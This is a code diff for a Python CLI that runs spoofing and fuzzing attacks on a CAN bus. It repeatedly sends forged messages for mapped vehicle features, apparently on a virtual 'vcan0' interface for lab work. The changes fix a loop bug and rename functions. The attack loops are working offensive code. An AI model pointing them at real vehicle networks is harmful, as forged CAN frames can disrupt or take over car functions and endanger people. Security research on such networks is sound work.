@@ -5,7 +5,7 @@ import random
 
 from reverse_engineering import FEATURE_CAN_ID_PAYLOAD_MAPPER
 
-def fuzzy_attack(bus):
+def fuzzy_attack_func(bus):
     known_attacks = list(FEATURE_CAN_ID_PAYLOAD_MAPPER.keys())
     n_of_attacks = len(known_attacks)
 
@@ -20,10 +20,12 @@ def fuzzy_attack(bus):
         print(f"Sent fuzzy attack message: {msg}")
         time.sleep(sleep_time)
 
-def spoofing_attacks(bus, feature: str, period: float):
+def spoofing_attacks_func(bus, feature: str, period: float):
+    print(f"inside spoofing attack")
+    selected_feature = FEATURE_CAN_ID_PAYLOAD_MAPPER[feature]
+    print(f"selected_feature = {selected_feature}")
     while True:
-        feature = FEATURE_CAN_ID_PAYLOAD_MAPPER[feature]
-        msg = can.Message(arbitration_id=feature['id'], data=feature['payload'], is_extended_id=False)
+        msg = can.Message(arbitration_id=selected_feature['id'], data=selected_feature['payload'], is_extended_id=False)
         bus.send(msg)
         print(f"Sent message: {msg}")
         time.sleep(period)
@@ -31,7 +33,7 @@ def spoofing_attacks(bus, feature: str, period: float):
 
 def main():
     print("CAN network attacks CLI")
-    spoofing_attacks = FEATURE_CAN_ID_PAYLOAD_MAPPER.keys()
+    spoofing_attacks = list(FEATURE_CAN_ID_PAYLOAD_MAPPER.keys())
     available_features = [*spoofing_attacks, "fuzzy"]
 
     parser = argparse.ArgumentParser(description="Perform CAN network attacks.")
@@ -44,15 +46,15 @@ def main():
         return
     if args.feature not in available_features:
         print(f"Feature '{args.feature}' is not available. Choose from {available_features}.")
-    bus = can.interface.Bus(channel='vcan0', bustype='socketcan')
+    bus = can.interface.Bus(channel='vcan0', interface='socketcan')
 
     try:
         if args.feature == "fuzzy":
             print(f"Attacking feature: {args.feature}")
-            fuzzy_attack(bus)
+            fuzzy_attack_func(bus)
         else:
             print(f"Attacking feature: {args.feature} with period {args.period} seconds")
-            spoofing_attacks(bus, args.feature, args.period)
+            spoofing_attacks_func(bus, args.feature, args.period)
     except KeyboardInterrupt:
         print("Attack stopped by user.")
     except Exception as e:
